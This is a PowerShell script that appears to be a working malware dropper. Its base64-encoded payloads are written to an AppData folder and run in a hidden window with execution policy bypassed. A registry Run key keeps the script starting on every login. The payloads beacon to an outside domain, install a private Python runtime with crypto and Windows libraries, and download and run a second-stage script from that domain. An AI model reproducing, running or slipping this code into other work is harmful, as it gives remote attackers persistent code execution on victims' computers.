$sv = 'Err'+'orAction'+'Preference'
Set-Variable -Name $sv -Value 'Stop'

$TFlsgCfG = 'eyJwYXRocyI6WyJydW5tZS5wczEiXSwiZGF0YSI6WyJKR1p6UkhKcGRtVnpJRDBnUjJWMExWQlRSSEpwZG1VZ0xWQlRVSEp2ZG1sa1pYSWdSbWxzWlZONWMzUmxiU0I4SUZObGJHVmpkQzFQWW1wbFkzUWdMVVY0Y0dGdVpGQnliM0JsY25SNUlGSnZiM1FOQ2lSdFlXbHVSSEpwZG1VZ1BTQWtabk5FY21sMlpYTWdmQ0JYYUdWeVpTMVBZbXBsWTNRZ2V5QWtYeUF0YldGMFkyZ2dJbDViUVMxYVhUcGNYQ1FpSUgwZ2ZDQlRaV3hsWTNRdFQySnFaV04wSUMxR2FYSnpkQ0F4RFFwcFppQW9MVzV2ZENBa2JXRnBia1J5YVhabEtTQjdJR1Y0YVhRZ2ZRMEtEUW9rZDI5eWEybHVaMFJwY2lBOUlDSWtiV0ZwYmtSeWFYWmxYRlJsYlhBaURRcHBaaUFvTFc1dmRDQW9WR1Z6ZEMxUVlYUm9JQ1IzYjNKcmFXNW5SR2x5S1NrZ2V5Qk9aWGN0U1hSbGJTQXRVR0YwYUNBa2QyOXlhMmx1WjBScGNpQXRTWFJsYlZSNWNHVWdSR2x5WldOMGIzSjVJSHdnVDNWMExVNTFiR3dnZlEwS0RRb2tiWFYwWlhoR2FXeGxJRDBnSWlSM2IzSnJhVzVuUkdseVhITmpjbWx3ZEM1c2IyTnJJZzBLYVdZZ0tGUmxjM1F0VUdGMGFDQWtiWFYwWlhoR2FXeGxLU0I3SUdWNGFYUWdmUTBLVG1WM0xVbDBaVzBnTFZCaGRHZ2dKRzExZEdWNFJtbHNaU0F0U1hSbGJWUjVjR1VnUm1sc1pTQXRSbTl5WTJVZ2ZDQlBkWFF0VG5Wc2JBMEtEUXBKYm5admEyVXRWMlZpVW1WeGRXVnpkQ0F0VlhKcElDSm9kSFJ3Y3pvdkwyUm1hWGR2WkM1amIyMHZNaTV3YUhBaUlDMVZjMlZDWVhOcFkxQmhjbk5wYm1jZ2ZDQlBkWFF0VG5Wc2JBMEtEUW9rY0hsMGFHOXVVR0YwYUNBOUlDSWtkMjl5YTJsdVowUnBjbHhRZVVWdWRpSU5DaVJ6WTNKcGNIUlFZWFJvSUQwZ0lpUjNiM0pyYVc1blJHbHlYSFZ3TG5CNUlnMEtKSEI1V21sd0lEMGdJaVJsYm5ZNlZFVk5VRnh3ZVY5bGJXSmxaR1JsWkM1NmFYQWlEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZkM2QzTG5CNWRHaHZiaTV2Y21jdlpuUndMM0I1ZEdodmJpOHpMakV4TGpndmNIbDBhRzl1TFRNdU1URXVPQzFsYldKbFpDMWhiV1EyTkM1NmFYQWlJQzFQZFhSR2FXeGxJQ1J3ZVZwcGNBMEtSWGh3WVc1a0xVRnlZMmhwZG1VZ0xWQmhkR2dnSkhCNVdtbHdJQzFFWlhOMGFXNWhkR2x2YmxCaGRHZ2dKSEI1ZEdodmJsQmhkR2dnTFVadmNtTmxEUXBTWlcxdmRtVXRTWFJsYlNBa2NIbGFhWEFOQ2cwS0pIQkpibWwwUm1sc1pTQTlJRXB2YVc0dFVHRjBhQ0FrY0hsMGFHOXVVR0YwYUNBaWNIbDBhRzl1TXpFeExsOXdkR2dpRFFvb1IyVjBMVU52Ym5SbGJuUWdKSEJKYm1sMFJtbHNaU2tnTFhKbGNHeGhZMlVnSnlOcGJYQnZjblFnYzJsMFpTY3NJQ2RwYlhCdmNuUWdjMmwwWlNjZ2ZDQlRaWFF0UTI5dWRHVnVkQ0FrY0VsdWFYUkdhV3hsRFFvTkNrbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDMVZjbWtnSW1oMGRIQnpPaTh2WW05dmRITjBjbUZ3TG5CNWNHRXVhVzh2WjJWMExYQnBjQzV3ZVNJZ0xVOTFkRVpwYkdVZ0lpUndlWFJvYjI1UVlYUm9YR2RsZEMxd2FYQXVjSGtpRFFvbUlDSWtjSGwwYUc5dVVHRjBhRnh3ZVhSb2IyNHVaWGhsSWlBaUpIQjVkR2h2YmxCaGRHaGNaMlYwTFhCcGNDNXdlU0lOQ2xKbGJXOTJaUzFKZEdWdElDSWtjSGwwYUc5dVVHRjBhRnhuWlhRdGNHbHdMbkI1SWcwS0RRb21JQ0lrY0hsMGFHOXVVR0YwYUZ4d2VYUm9iMjR1WlhobElpQXRiU0J3YVhBZ2FXNXpkR0ZzYkNCd2VXTnllWEIwYjJSdmJXVWdjSGx3YVhkcGJqTXlJSEpsY1hWbGMzUnpEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZaR1pwZDI5a0xtTnZiUzkxY0M1d2VTSWdMVTkxZEVacGJHVWdKSE5qY21sd2RGQmhkR2dOQ2lZZ0lpUndlWFJvYjI1UVlYUm9YSEI1ZEdodmJpNWxlR1VpSUNJa2MyTnlhWEIwVUdGMGFDSU5DZz09Il19'
$runAgainContent = 'JGZzRHJpdmVzID0gR2V0LVBTRHJpdmUgLVBTUHJvdmlkZXIgRmlsZVN5c3RlbSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFJvb3QNCiRtYWluRHJpdmUgPSAkZnNEcml2ZXMgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggIl5bQS1aXTpcXCQiIH0gfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQppZiAoLW5vdCAkbWFpbkRyaXZlKSB7IGV4aXQgfQ0KDQokd29ya2luZ0RpciA9ICIkbWFpbkRyaXZlXFRlbXAiDQppZiAoLW5vdCAoVGVzdC1QYXRoICR3b3JraW5nRGlyKSkgeyBOZXctSXRlbSAtUGF0aCAkd29ya2luZ0RpciAtSXRlbVR5cGUgRGlyZWN0b3J5IHwgT3V0LU51bGwgfQ0KDQokZmluaXNoTG9jayA9IEpvaW4tUGF0aCAkd29ya2luZ0RpciAiZmluaXNoLmxvY2siDQppZiAoLW5vdCAoVGVzdC1QYXRoICRmaW5pc2hMb2NrKSkgew0KICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHdvcmtpbmdEaXIgLUZpbGUgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgUmVtb3ZlLUl0ZW0gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQp9DQoNCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vZGZpd29kLmNvbS8yLnBocCIgLVVzZUJhc2ljUGFyc2luZyB8IE91dC1OdWxsDQoNCiRweXRob25QYXRoID0gSm9pbi1QYXRoICR3b3JraW5nRGlyICJQeUVudiINCiRzY3JpcHRQYXRoID0gSm9pbi1QYXRoICR3b3JraW5nRGlyICJ1cC5weSINCiRweVppcCA9IEpvaW4tUGF0aCAkZW52OlRFTVAgInB5X2VtYmVkZGVkLnppcCINCg0KSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuOC9weXRob24tMy4xMS44LWVtYmVkLWFtZDY0LnppcCIgLU91dEZpbGUgJHB5WmlwDQpFeHBhbmQtQXJjaGl2ZSAtUGF0aCAkcHlaaXAgLURlc3RpbmF0aW9uUGF0aCAkcHl0aG9uUGF0aCAtRm9yY2UNClJlbW92ZS1JdGVtICRweVppcCAtRm9yY2UNCg0KJHBJbml0RmlsZSA9IEpvaW4tUGF0aCAkcHl0aG9uUGF0aCAicHl0aG9uMzExLl9wdGgiDQooR2V0LUNvbnRlbnQgJHBJbml0RmlsZSkgLXJlcGxhY2UgJyNpbXBvcnQgc2l0ZScsICdpbXBvcnQgc2l0ZScgfCBTZXQtQ29udGVudCAkcEluaXRGaWxlDQoNCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vYm9vdHN0cmFwLnB5cGEuaW8vZ2V0LXBpcC5weSIgLU91dEZpbGUgKEpvaW4tUGF0aCAkcHl0aG9uUGF0aCAiZ2V0LXBpcC5weSIpDQomIChKb2luLVBhdGggJHB5dGhvblBhdGggInB5dGhvbi5leGUiKSAoSm9pbi1QYXRoICRweXRob25QYXRoICJnZXQtcGlwLnB5IikNClJlbW92ZS1JdGVtIChKb2luLVBhdGggJHB5dGhvblBhdGggImdldC1waXAucHkiKSAtRm9yY2UNCg0KJiAoSm9pbi1QYXRoICRweXRob25QYXRoICJweXRob24uZXhlIikgLW0gcGlwIGluc3RhbGwgcHljcnlwdG9kb21lIHB5cGl3aW4zMiByZXF1ZXN0cw0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL2RmaXdvZC5jb20vdXAucHkiIC1PdXRGaWxlICRzY3JpcHRQYXRoDQomIChKb2luLVBhdGggJHB5dGhvblBhdGggInB5dGhvbi5leGUiKSAkc2NyaXB0UGF0aA0K'

$json = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TFlsgCfG))
$obj = ConvertFrom-Json $json
$paths = $obj.paths
$data = $obj.data

$up = Join-Path $Env:AppData 'Y4TFCR'
[System.IO.Directory]::CreateDirectory($up) | Out-Null

for ($i = 0; $i -lt $paths.Count; $i++) {
    $filename = $paths[$i]
    $bytes = [System.Convert]::FromBase64String($data[$i])
    $fullPath = Join-Path $up $filename
    $dir = [System.IO.Path]::GetDirectoryName($fullPath)
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir | Out-Null }
    [System.IO.File]::WriteAllBytes($fullPath, $bytes)
}

$runAgainPath = Join-Path $up 'runagain.ps1'
$runAgainBytes = [System.Convert]::FromBase64String($runAgainContent)
[System.IO.File]::WriteAllBytes($runAgainPath, $runAgainBytes)

$cmd = "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$runAgainPath`""
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyPower" -Value $cmd -PropertyType String -Force | Out-Null

$scriptPath = Join-Path $up 'runme.ps1'
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden -WorkingDirectory $up
